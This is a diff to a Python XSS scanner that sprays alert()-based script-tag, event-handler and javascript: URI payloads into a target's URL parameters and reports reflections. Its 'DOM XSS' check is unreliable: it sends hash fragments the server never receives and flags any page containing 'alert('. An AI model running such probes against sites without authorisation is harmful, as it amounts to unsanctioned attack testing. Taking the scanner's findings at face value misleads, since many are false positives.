@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-ZeroScope Pro - Precision XSS Scanner
+ZeroScope Pro - Effective XSS Scanner with DOM/Reflected Detection
 """
 
 import argparse
@@ -21,75 +21,88 @@ class ZeroScope:
 ╚══════╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═════╝░░╚════╝░░╚════╝░╚═╝░░░░░╚══════╝
 {Style.RESET_ALL}"""
         self.session = requests.Session()
-        self.session.headers = {
-            'User-Agent': 'ZeroScope/1.0',
-            'Accept': 'text/html,application/xhtml+xml'
-        }
+        self.session.headers = {'User-Agent': 'ZeroScope/2.0'}
         self.vulnerabilities = []
 
-    def test_xss_game_vulnerability(self, url):
-        """Specialized test for XSS Game challenges"""
-        test_payloads = [
-            '<script>alert("XSS")</script>',
-            '<img src=x onerror=alert("XSS")>',
-            "' onmouseover=alert('XSS')",
-            '" onfocus=alert("XSS") autofocus'
+    def test_dom_xss(self, url):
+        """Test for DOM XSS using hash payloads"""
+        payloads = [
+            ("#<script>alert('DOM_XSS')</script>", "DOM Injection", "High"),
+            ("#javascript:alert('DOM_XSS')", "JS URI Injection", "High"),
+            ("#'><img src=x onerror=alert('DOM_XSS')>", "DOM Breakout", "Medium")
+        ]
+        
+        for payload, vuln_type, severity in payloads:
+            test_url = f"{url}{payload}"
+            try:
+                response = self.session.get(test_url, timeout=5)
+                if "DOM_XSS" in response.text or "alert(" in response.text:
+                    self.vulnerabilities.append({
+                        'url': test_url,
+                        'type': f"DOM XSS ({vuln_type})",
+                        'severity': severity,
+                        'payload': payload
+                    })
+            except Exception as e:
+                print(f"{Fore.YELLOW}[!] Error testing DOM XSS: {e}{Style.RESET_ALL}")
+
+    def test_reflected_xss(self, url):
+        """Test for reflected XSS in parameters"""
+        payloads = [
+            ("<script>alert('XSS')</script>", "Basic Script Tag", "Critical"),
+            ("\" onmouseover=alert('XSS') ", "Event Handler", "High"),
+            ("'><svg/onload=alert('XSS')>", "Tag Breakout", "High"),
+            ("javascript:alert('XSS')", "JS URI", "Medium")
         ]
         
         parsed = urlparse(url)
-        if 'xss-game.appspot.com' in parsed.netloc:
-            # Special handling for XSS Game
-            for payload in test_payloads:
-                test_url = f"{url}?query={quote(payload)}"
+        if parsed.query:
+            params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
+            for param in params:
+                for payload, vuln_type, severity in payloads:
+                    test_params = params.copy()
+                    test_params[param] = payload
+                    test_url = urlunparse(parsed._replace(query=urlencode(test_params)))
+                    try:
+                        response = self.session.get(test_url)
+                        if payload in response.text:
+                            self.vulnerabilities.append({
+                                'url': test_url,
+                                'type': f"Reflected XSS ({vuln_type})",
+                                'severity': severity,
+                                'payload': payload
+                            })
+                    except Exception as e:
+                        print(f"{Fore.YELLOW}[!] Error testing {param}: {e}{Style.RESET_ALL}")
+        else:
+            # Test with default parameter if no query exists
+            for payload, vuln_type, severity in payloads:
+                test_url = f"{url}?test={quote(payload)}"
                 try:
-                    response = self.session.get(test_url, timeout=5)
+                    response = self.session.get(test_url)
                     if payload in response.text:
-                        self.vulnerabilities.append((
-                            test_url,
-                            "Reflected XSS in query parameter",
-                            f"{Fore.RED}CRITICAL{Style.RESET_ALL}"
-                        ))
-                        return True
+                        self.vulnerabilities.append({
+                            'url': test_url,
+                            'type': f"Reflected XSS ({vuln_type})",
+                            'severity': severity,
+                            'payload': payload
+                        })
                 except Exception as e:
-                    print(f"{Fore.YELLOW}[!] Error testing {test_url}: {e}{Style.RESET_ALL}")
-        return False
-
-    def test_generic_xss(self, url):
-        """Test for generic XSS vulnerabilities"""
-        test_payloads = [
-            ('<script>alert(1)</script>', "Basic script tag"),
-            ('" onmouseover=alert(1) ', "Event handler"),
-            ('javascript:alert(1)', "JavaScript URI"),
-            ('{{constructor.constructor("alert(1)")()}}', "Template injection")
-        ]
-        
-        for payload, description in test_payloads:
-            test_url = f"{url}?test={quote(payload)}"
-            try:
-                response = self.session.get(test_url, timeout=5)
-                if payload in response.text:
-                    self.vulnerabilities.append((
-                        test_url,
-                        f"Reflected XSS ({description})",
-                        f"{Fore.RED}CRITICAL{Style.RESET_ALL}"
-                    ))
-            except Exception as e:
-                print(f"{Fore.YELLOW}[!] Error testing {test_url}: {e}{Style.RESET_ALL}")
+                    print(f"{Fore.YELLOW}[!] Error testing reflected XSS: {e}{Style.RESET_ALL}")
 
     def scan(self, url):
         """Main scanning function"""
         print(self.banner)
         print(f"{Fore.GREEN}[+] Testing: {url}{Style.RESET_ALL}")
         
-        # First try specialized XSS Game test
-        if not self.test_xss_game_vulnerability(url):
-            # Fall back to generic tests if not XSS Game
-            self.test_generic_xss(url)
+        # Test both DOM and Reflected XSS
+        self.test_dom_xss(url)
+        self.test_reflected_xss(url)
         
         self.report_results()
 
     def report_results(self):
-        """Display scan results"""
+        """Display scan results with type and severity"""
         print(f"\n{Fore.CYAN}=== Scan Results ==={Style.RESET_ALL}")
         
         if not self.vulnerabilities:
@@ -97,10 +110,12 @@ class ZeroScope:
             return
             
         print(f"{Fore.RED}[!] Found {len(self.vulnerabilities)} vulnerabilities:{Style.RESET_ALL}")
-        for i, (url, desc, severity) in enumerate(self.vulnerabilities, 1):
-            print(f"\n{i}. {severity}{url}{Style.RESET_ALL}")
-            print(f"   Type: {desc}")
-            print(f"   Severity: {severity.split(':')[0]}")
+        for i, vuln in enumerate(self.vulnerabilities, 1):
+            severity_color = Fore.RED if vuln['severity'] in ['Critical','High'] else Fore.YELLOW
+            print(f"\n{i}. {Fore.CYAN}{vuln['url']}{Style.RESET_ALL}")
+            print(f"   {Fore.WHITE}Type: {vuln['type']}{Style.RESET_ALL}")
+            print(f"   {severity_color}Severity: {vuln['severity']}{Style.RESET_ALL}")
+            print(f"   Payload: {Fore.MAGENTA}{vuln['payload']}{Style.RESET_ALL}")
 
 def main():
     parser = argparse.ArgumentParser(description='ZeroScope XSS Scanner')
@@ -113,4 +128,5 @@ def main():
     scanner.scan(args.url)
 
 if __name__ == "__main__":
+    from urllib.parse import parse_qs, urlencode, urlunparse
     main()
